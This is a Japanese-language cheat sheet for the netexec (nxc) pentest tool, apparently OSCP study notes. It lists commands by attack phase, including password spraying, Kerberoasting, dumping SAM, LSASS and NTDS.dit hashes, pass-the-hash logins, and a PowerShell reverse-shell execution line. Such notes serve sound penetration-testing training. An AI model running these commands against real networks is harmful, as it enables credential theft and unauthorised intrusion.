# netexec (nxc)

## 🎯 概要
**netexec**（旧CrackMapExec）は、Active Directory環境などの大規模なネットワークにおいて、サービスの列挙、認証情報の検証、およびポストエクスプロイトを自動化するための強力な「スイスアーミーナイフ」的ツールです。SMB、WMI、LDAP、MSSQL、WinRM、RDP、SSH、FTPなど多種多様なプロトコルに対応しており、ペネトレーションテストやOSCPにおいて横展開（Lateral Movement）やドメイン全体の脆弱な設定を特定する際に中心的な役割を果たします。

---

## 🛠 代表的な用途
- **資格情報の検証とスプレー**: 入手したユーザー名とパスワード（またはハッシュ）がネットワーク内のどのホストで有効かを一括確認。
- **共有フォルダの権限列挙**: 各ホストのSMB共有に対するアクセス権（Read/Write）を迅速にマッピング。
- **機密情報の奪取**: SAM、LSA、NTDS.ditなどのデータベースからハッシュをダンプ。
- **リモートコマンド実行**: 適切な権限がある場合、WMIやSMBを介してOSコマンドを実行し、リバースシェルを確立。
- **OSCPでの利用ポイント**: ドメイン環境の攻略において、1つの有効な資格情報を見つけた後に「Pwned!（管理者権限あり）」なホストを特定し、次の足がかりを得るために必須です。

---

## 🔍 基本コマンド
```bash
# 指定したプロトコル（例：smb）でヘルプを表示
nxc smb -h

# ネットワーク範囲に対して匿名ログインを試行
nxc smb 10.10.10.0/24 -u 'guest' -p ''

# 特定のユーザー名とパスワードで認証を確認
nxc smb 10.10.10.1 -u 'admin' -p 'password123'

# 資格情報が有効なホストに対してSMB共有を一覧表示
nxc smb 10.10.10.0/24 -u 'user' -p 'pass' --shares
```

---

## 🧪 よく使う攻撃シナリオ
- **パスワードスプレー攻撃**: 共通のパスワード（例：`Welcome123!`）を使って、全ドメインユーザーに対してログインを試行し、脆弱なアカウントを特定します。
- **パス・ザ・ハッシュ (PtH)**: 入手したNTハッシュを直接使用して、平文パスワードを知ることなく他ホストへ管理者としてアクセスします。
- **管理者権限の連鎖**: 管理者権限（Pwned!）を持つホストでLSASSメモリをダンプし、さらに別の資格情報を入手してネットワーク内を移動します。

---

## 📌 フェーズ別コマンド例  

### 🔎 Reconnaissance（技術的偵察）
```bash
# SMB署名の有無を確認（リレー攻撃の可否を判断）
nxc smb 10.10.10.0/24

# 各ホストで動作しているOSのバージョンとビルド番号を特定
nxc smb 192.168.50.0/24

# WMIサービスが有効で応答するホストを特定
nxc wmi 192.168.50.0/24 -u '' -p ''
```

---

### 🧭 Enumeration（外部サービスの詳細調査）
```bash
# ドメイン内のユーザー一覧を取得（LDAP経由）
nxc ldap 10.10.10.1 -u 'user' -p 'pass' --users

# ドメインのパスワードポリシーを確認（ロックアウトしきい値など）
nxc smb 10.10.10.1 -u 'user' -p 'pass' --pass-pol

# 各ホストにログインしているユーザーを特定
nxc smb 10.10.10.0/24 -u 'admin' -p 'pass' --loggedon-users

# ドメイングループとそのメンバーをリストアップ
nxc ldap 10.10.10.1 -u 'user' -p 'pass' --groups

# ホスト上のディスクドライブを一覧表示
nxc smb 10.10.10.1 -u 'admin' -p 'pass' --disks
```

---

### 🚪 Initial Access（初期侵入）
```bash
# 判明したユーザーリストに対してパスワードスプレーを実行
nxc smb 10.10.10.1 -u users.txt -p 'Spring2024!'

# AS-REP Roastingが可能なユーザーを探索（LDAP経由）
nxc ldap 10.10.10.1 -u 'user' -p 'pass' --asreproast output.txt

# Kerberoasting用のサービスチケットを要求
nxc ldap 10.10.10.1 -u 'user' -p 'pass' --kerberoasting output.txt
```

---

### 📋 Local Enumeration（侵入後のローカル調査）
```bash
# 管理者権限を持つホストでSAMデータベースをダンプ
nxc smb 10.10.10.1 -u 'admin' -p 'pass' --sam

# LSAシークレットをダンプ（サービスアカウントのパスワードなど）
nxc smb 10.10.10.1 -u 'admin' -p 'pass' --lsa

# ホストに保存されているワイヤレスネットワークのパスワードを抽出
nxc smb 10.10.10.1 -u 'admin' -p 'pass' -M wifi
```

---

### 📈 Privilege Escalation（権限昇格）
```bash
# GPO（グループポリシー）に保存された暗号化パスワードを探索
nxc smb 10.10.10.1 -u 'user' -p 'pass' -M gpp_password

# 権限昇格のヒントとなる未引用のサービスパスなどをチェック
nxc smb 10.10.10.1 -u 'user' -p 'pass' -M enum_av
```

---

### 🔑 Credential Access（認証情報探索）
```bash
# LSASSプロセスからメモリ内のパスワード/ハッシュをダンプ
nxc smb 10.10.10.1 -u 'admin' -p 'pass' --lsass

# ドメインコントローラーからNTDS.ditをダンプ（全ユーザーハッシュ）
nxc smb 10.10.10.100 -u 'DomainAdmin' -p 'pass' --ntds vss

# 入手したNTハッシュを使用して認証を確認（PtH）
nxc smb 10.10.10.0/24 -u 'Administrator' -H '7a38310ea6f0027ee955abed1762964b'
```

---

### 🏢 Active Directory（AD）
```bash
# 全てのドメインコントローラーを特定
nxc ldap 10.10.10.1 -u 'user' -p 'pass' --dc-list

# ドメイン内のコンピュータアカウントを一覧表示
nxc ldap 10.10.10.1 -u 'user' -p 'pass' --computers

# ドメイン信頼関係（Trusts）を確認
nxc ldap 10.10.10.1 -u 'user' -p 'pass' --trusted-for-delegation
```

---

### 🌐 Internal Enumeration（内部ネットワーク探索）
```bash
# MSSQLサーバーをスキャンし、デフォルト設定や権限を確認
nxc mssql 10.10.10.0/24 -u 'sa' -p 'password'

# WinRMが有効な管理用ホストを特定
nxc winrm 10.10.10.0/24 -u 'user' -p 'pass'
```

---

### 🚪 Pivot / Port Forward（内部サービスへのアクセス）
```bash
# Proxychains経由で内部セグメントに対してスキャンを実行
proxychains nxc smb 172.16.5.0/24 -u 'user' -p 'pass'
```

---

### 🚀 Lateral Movement（横展開）
```bash
# 管理者権限があるホストでOSコマンドを実行（例：whoami）
nxc smb 10.10.10.1 -u 'admin' -p 'pass' -x 'whoami'

# WMIを使用してコマンドを実行（検知されにくい）
nxc wmi 10.10.10.1 -u 'admin' -p 'pass' -x 'systeminfo'

# 特定のホストに対してリバースシェルを送り込む
nxc smb 10.10.10.1 -u 'admin' -p 'pass' -x 'powershell -e <Base64_Payload>'
```

---

## 🧰 便利オプション一覧
- `--shares`：共有フォルダとアクセス権限を表示。
- `--users` / `--groups`：ユーザーやグループを列挙。
- `--continue-on-success`：認証に成功してもスキャンを止めずに継続。
- `-M <module>`：特定のポストエクスプロイトモジュールを実行。
- `-x <command>`：リモートでOSコマンドを実行。
- `-H <hash>`：パスワードの代わりにNTハッシュを使用（PtH）。
- `--local-auth`：ドメイン認証ではなくローカル認証を使用。
- `--id`：RIDからユーザー名などの詳細を特定。

---

## 🚀 実践例
```bash
# 【例1】ドメイン内の全ホストに対し、特定のユーザーがローカル管理者権限を持っているか確認
nxc smb 10.10.10.0/24 -u 'svc_backup' -p 'Backup123!' --continue-on-success | grep 'Pwned!'

# 【例2】入手したハッシュを使って管理者としてアクセスし、即座にNTDS.ditをダンプする
nxc smb 10.10.10.100 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e' --ntds vss

# 【例3】MSSQLサーバーに対し、xp_cmdshellが有効化可能か確認し、コマンドを実行する
nxc mssql 10.10.10.50 -u 'db_admin' -p 'password' -M eazy_install -x 'whoami'
```

---

## 🧩 他ツールとの組み合わせ
- **ffuf** → Webディレクトリ列挙で見つかった資格情報（`creds.txt`）を `nxc -u` に渡してネットワーク全体での有効性を検証。
- **netexec** → 自身の出力を利用して、次のターゲットとなる「Pwned!」ホストを選択。
- **impacket** → nxcで書き込み権限を確認した後、`psexec.py` や `wmiexec.py` で対話型シェルを取得。
- **BloodHound** → nxcの収集モジュールを使用して、ドメイン内の攻撃パスを可視化。

---

## 📝 注意点（OSCP 試験での使い方）
- **アカウントロックアウト**: パスワードスプレーを行う際は、事前に `--pass-pol` でロックアウトしきい値を確認し、アカウントをロックさせないよう注意してください。
- **SMB署名の要件**: 署名が必須（Required: True）のホストに対しては、リレー攻撃はできませんが、正当な資格情報があればnxcでのログインは可能です。
- **証跡の保存**: 大量のホストをスキャンするため、出力結果を `tee` や `-o` でファイルに保存し、レポート作成時に「どの資格情報がどこで使えたか」を明確に示せるようにしてください。

---

## 🔗 参考リンク
- 公式：[NetExec GitHub Repository](https://github.com/PennyWise-Team/NetExec)
- 公式 Wiki：[NetExec Documentation](https://www.netexec.wiki/)
- 良質解説：[CrackMapExec to NetExec Transition Guide](https://www.netexec.wiki/getting-started/terminology)
